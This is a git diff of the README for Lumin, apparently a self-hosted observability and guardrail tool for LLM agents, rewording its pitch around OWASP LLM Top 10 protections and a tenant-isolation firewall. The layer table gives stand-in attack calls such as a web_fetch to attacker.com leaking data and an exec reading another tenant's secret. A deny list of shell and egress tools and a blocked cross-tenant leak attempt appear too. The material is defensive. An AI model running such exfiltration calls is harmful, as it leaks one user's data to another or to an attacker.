@@ -1,5 +1,5 @@
 <p align="center">
-   <img src="assets/lumin-banner.svg" alt="Lumin — local-first agent observability + tenant-isolation firewall" width="100%" />
+   <img src="assets/lumin-banner.svg" alt="Lumin — local-first observability + security for LLM agents" width="100%" />
 </p>
 
 <div align="center">
@@ -7,8 +7,8 @@
       <a href="#-quickstart">
          <strong>Self-Host in 60 seconds</strong>
       </a> ·
-      <a href="#%EF%B8%8F-the-tenant-isolation-firewall--lumins-unique-angle">
-         <strong>Tenant Firewall</strong>
+      <a href="#%EF%B8%8F-owasp-llm-top-10-guardrails--at-runtime">
+         <strong>Security Guardrails</strong>
       </a> ·
       <a href="#-integrations">
          <strong>Integrations</strong>
@@ -73,7 +73,7 @@
 
 - **🔍 Agent observability** — instrument any Python or TypeScript agent in 2 lines. Captures every LLM call, tool invocation, retrieval, embedding, and custom span. Real-time WebSocket push to the dashboard, no refresh.
 
-- **🛡️ [Tenant-isolation firewall](#%EF%B8%8F-the-tenant-isolation-firewall--lumins-unique-angle)** — five layers of structural defense for multi-user bots (Slack, Telegram, Discord, internal SaaS). Per-user file sandbox, deny-by-default for shells / network egress, conversation-history reset on sender switch, Presidio-powered prompt redaction, full audit trail. **Stops cross-session leaks structurally — not with a regex.**
+- **🛡️ [OWASP LLM Top 10 guardrails — at runtime](#%EF%B8%8F-owasp-llm-top-10-guardrails--at-runtime)** — prompt-injection detection (LLM01), Presidio NER PII redaction (LLM02/LLM06), insecure-output filtering (LLM05), excessive-agency controls on shells/network egress (LLM08), supply-chain audit for tool calls (LLM03). For multi-tenant bots, the LLM08/LLM10 layer extends to a per-user file sandbox + conversation-history reset on sender switch. **Structural, not a regex.**
 
 - **⚙️ [One-knob security profiles](#3%EF%B8%8F⃣-1%EF%B8%8F⃣-configure-your-agents-plugin)** — pick `strict`, `standard`, `light`, or `logging-only`. Each profile sets sensible defaults across all five layers. Override individual toggles via dashboard UI without touching config files.
 
@@ -89,35 +89,53 @@
 
 - **🏠 Local-first** — single Docker image, DuckDB + SQLite, no external services, no cloud dependency. Runs on a laptop or a 2-vCPU VPS.
 
-## 🛡️ The Tenant-Isolation Firewall — Lumin's Unique Angle
+## 🛡️ OWASP LLM Top 10 Guardrails — at runtime
 
-Most LLM observability tools tell you what your bot did *after* it did it. They don't stop one customer's data from leaking into another customer's chat. **Lumin does.**
+Most LLM tools split into two camps. **Observability** (Langfuse, LangSmith, Helicone, Arize) tells you what your agent did *after* it did it. **Guardrail classifiers** (Lakera, NemoGuardrails) score single prompts in isolation. Neither, alone, is enough to ship an AI agent into production.
 
-The five-layer defense:
+**Lumin is both, in one self-hosted Docker container.** Every span ingested is recorded *and* scored against runtime OWASP LLM Top 10 protections:
+
+| OWASP risk | Lumin protection |
+|---|---|
+| **LLM01 — Prompt Injection** | Pattern + LLM-judge detection on every input. Blocks or flags before the prompt reaches the model. |
+| **LLM02 / LLM06 — Sensitive Info Disclosure** | Microsoft Presidio NER scrubs PII, names, orgs, IDs, emails, phones, SSNs, credit cards, passports from prompts and history (configurable confidence threshold). |
+| **LLM03 — Supply-Chain** | Every tool call audited with a tamper-evident trail. Tool allowlist + plugin manifest signing. |
+| **LLM05 — Insecure Output Handling** | Output-filter chain (regex + structural) before responses leave the agent. Blocks PII echo-back and exfiltration patterns. |
+| **LLM08 — Excessive Agency** | Deny-by-default for shells (`exec`, `bash`, `python`, `ruby`, …) and network egress (`web_fetch`, `curl`, `http_*`). Per-user file sandbox. |
+| **LLM09 — Overreliance** | Policy engine with declarative rules + human approval queue. Anything outside the rules pauses until a human signs off. |
+| **LLM10 — Model Theft / Cross-tenant Exfiltration** | Tenant-isolation firewall: conversation-history reset on sender switch, structural blocking of cross-session leaks in multi-tenant bots. |
+
+### The tenant-isolation layer in detail
+
+LLM08 + LLM10 together cover a problem most guardrail classifiers miss: in a multi-tenant Slack / Telegram / Discord / SaaS bot, one customer's data leaking into another customer's chat. Lumin's tenant firewall stacks five structural layers:
 
 | Layer | What it does |
 |---|---|
 | **L1 storage sandbox** | Every fs tool call (`read`, `write`, `edit`, `grep`, `cat`, `head`, `tail`, …) gets its `path` parameter rewritten to `${workspace}/_lumin/by-sender/<sender>/`. The bot literally has no path to another tenant's data. |
 | **L1.5 deny shell + egress** | Tools that bypass file paths — `exec`, `shell`, `bash`, `python`, `web_fetch`, `http_get`, `curl` — refused by default. An attacker can't `exec("cat ../alice/secret")` or `web_fetch("https://attacker.com?leak=...")`. |
 | **L2 conversation history reset** | When the active sender changes for a shared agent, the LLM's message history is wiped before it sees the next turn. Foreign-tenant text never enters context. |
-| **L3 input redaction** | Every prompt + history scanned by Presidio NER (names, emails, locations, organizations) + structural ID regexes + foreign-vault excerpts before the LLM call. Replaced with `[REDACTED]`. |
-| **L4 audit trail** | Every block, redaction, and sandbox rewrite generates a row in `policy_violations` queryable from the dashboard `/violations` page. Webhooks fire to PagerDuty / Slack / SIEM. |
+| **L3 input redaction** | Every prompt + history scanned by Presidio NER + structural ID regexes + foreign-vault excerpts before the LLM call. Replaced with `[REDACTED]`. |
+| **L4 audit trail** | Every block, redaction, and sandbox rewrite recorded in `policy_violations`. Webhooks fire to PagerDuty / Slack / SIEM. |
 
 **Verified live**: a real Telegram → Slack leak attempt with the `standard` profile blocked all 5+ bypass routes (3 `exec` calls denied, 2 `read` calls sandboxed to empty per-sender dir, 97 prior-tenant messages cleared from history, foreign-vault entries redacted from the prompt). The bot's reply contained zero foreign-tenant data. See the demo video above.
 
-Compare to other tools:
+### How Lumin compares
 
 | | Lumin | Langfuse | Lakera | NemoGuard |
 |---|---|---|---|---|
-| **Tracing/spans/evals** | ✅ | ✅ | ❌ | ❌ |
-| **Per-user file sandbox** | ✅ structural | ❌ | ❌ | ❌ |
-| **Conversation history isolation** | ✅ structural | ❌ | ❌ | ❌ |
-| **PII redaction in prompt** | ✅ Presidio | ❌ | ✅ classifier | ✅ classifier |
-| **Deny-by-default for exec/web_fetch** | ✅ | ❌ | ❌ | ❌ |
+| **Full-trace observability** | ✅ | ✅ | ❌ | ❌ |
+| **Cost + token attribution** | ✅ | ✅ | ❌ | ❌ |
+| **Evals + scoring** | ✅ | ✅ | ❌ | ❌ |
+| **Prompt-injection detection (LLM01)** | ✅ | ❌ | ✅ | ✅ |
+| **PII redaction in prompt (LLM02/LLM06)** | ✅ Presidio | ❌ | ✅ classifier | ✅ classifier |
+| **Excessive-agency guard (LLM08)** | ✅ deny exec/fetch | ❌ | ❌ | ❌ |
+| **Per-user file sandbox (LLM10)** | ✅ structural | ❌ | ❌ | ❌ |
+| **Conversation history isolation (LLM10)** | ✅ structural | ❌ | ❌ | ❌ |
+| **Policy engine + approval queue** | ✅ | ❌ | ❌ | ⚠️ partial |
 | **Self-hosted single Docker** | ✅ | ⚠️ ClickHouse + Postgres + Redis + S3 | ❌ SaaS | ❌ NIM endpoint |
-| **Open source (Apache-2.0)** | ✅ | ✅ MIT | ❌ | ✅ Apache-2.0 |
+| **Open source** | ✅ Apache-2.0 | ✅ MIT | ❌ | ✅ Apache-2.0 |
 
-Lumin replaces Langfuse for one specific job: **keeping multi-tenant bots safe**. For everything else, Lumin and Langfuse can co-exist (different layers).
+Lumin and Langfuse can coexist — Lumin adds the security layer on top of any observability stack. For teams who want a single container instead of a stack, Lumin alone covers both jobs.
 
 ---
 
@@ -473,8 +491,8 @@ You can use Lumin free for any purpose — commercial, internal, hosted as a ser
 ---
 
 <p align="center">
-   <strong>Lumin replaces Langfuse for one specific job: keeping multi-tenant AI bots safe.</strong><br/>
-   For everything else, they co-exist. Different layers.
+   <strong>Observability + OWASP LLM Top 10 guardrails in a single Docker container.</strong><br/>
+   Local-first, Apache-2.0, no telemetry. Your traces never leave your machine.
 </p>
 
 <p align="center">
